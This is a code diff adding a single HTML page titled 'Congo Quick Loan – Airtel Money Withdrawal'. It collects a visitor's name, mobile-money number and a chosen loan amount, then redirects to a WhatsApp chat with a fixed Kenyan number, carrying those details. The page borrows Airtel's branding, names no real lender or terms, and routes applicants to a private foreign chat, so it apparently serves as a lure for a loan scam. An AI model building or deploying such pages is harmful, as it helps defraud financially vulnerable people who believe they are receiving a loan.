@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Congo Loan - Airtel Money Withdrawal</title>
+<style>
+  body{font-family:Inter,Arial,sans-serif;background:#f5f7fb;margin:0;padding:16px}
+  .card{max-width:480px;margin:30px auto;background:#fff;border-radius:16px;box-shadow:0 8px 24px rgba(0,0,0,.08);overflow:hidden}
+  .head{background:#e60000;padding:24px;text-align:center;color:#fff}
+  .head h2{margin:0}
+  .content{padding:24px}
+  label{font-size:13px;font-weight:600;margin:12px 0 6px;display:block}
+  input,select{width:100%;padding:13px;border:1.5px solid #d7dde8;border-radius:10px;font-size:15px;box-sizing:border-box}
+  .btn{width:100%;padding:14px;background:#e60000;color:#fff;border:none;border-radius:10px;font-weight:700;font-size:15px;margin-top:20px;cursor:pointer}
+  .small{font-size:11px;color:#888;text-align:center;margin-top:12px;line-height:1.4}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="head">
+    <h2>Congo Quick Loan</h2>
+    <p style="margin:6px 0 0;font-size:14px">Withdraw to Airtel Money</p>
+  </div>
+  <div class="content">
+    <label>Full Name</label>
+    <input id="name" placeholder="Your name">
+    <label>Airtel Number to RECEIVE Loan</label>
+    <input id="momo" placeholder="+243 97 000 0000">
+    <label>Amount (CDF)</label>
+    <select id="amt">
+      <option>50,000 CDF</option>
+      <option>100,000 CDF</option>
+      <option>250,000 CDF</option>
+      <option>500,000 CDF</option>
+    </select>
+    <button class="btn" onclick="goWA()">WITHDRAW TO MY AIRTEL NOW</button>
+    <p class="small">We will never ask for your Airtel Money PIN.<br>Your request will be processed as soon as possible.<br>Not affiliated with Airtel Money - independent loan service.</p>
+  </div>
+</div>
+<script>
+function goWA(){
+  const name=document.getElementById('name').value||'Applicant';
+  const momo=document.getElementById('momo').value;
+  const amt=document.getElementById('amt').value;
+  if(!momo||momo.length<9){alert('Enter Airtel number to receive money');return;}
+  const msg=`Hello, Congo Loan request.%0AName: ${encodeURIComponent(name)}%0AAirtel to RECEIVE: ${encodeURIComponent(momo)}%0AAmount: ${encodeURIComponent(amt)}`;
+  window.location.href=`https://wa.me/254723224995?text=${msg}`;
+}
+</script>
+</body>
+</html>
